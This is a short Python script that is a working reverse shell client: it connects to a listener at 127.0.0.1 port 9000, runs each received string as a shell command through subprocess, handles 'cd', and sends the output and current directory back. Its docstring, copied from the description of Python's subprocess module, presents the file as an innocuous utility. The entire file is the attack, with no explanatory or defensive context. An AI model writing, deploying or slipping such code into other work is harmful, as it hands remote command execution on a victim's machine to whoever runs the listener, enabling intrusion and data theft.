import socket
import os
import subprocess

"""
Subprocesses with accessible I/O streams.

This module allows you to spawn processes, 
connect to their input/output/error pipes, 
and obtain their return codes.    

"""

s = socket.socket()
host = "127.0.0.1"
port = 9000

s.connect((host,port))

while True:
    
    data = s.recv(1024)
    
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
        
    if len(data) > 0:
        cmd = subprocess.Popen( data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE )
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes,"utf-8")
        presentWD= os.getcwd()+"$ "
        s.send(str.encode(output_str + presentWD))
        print(output_str)
        
        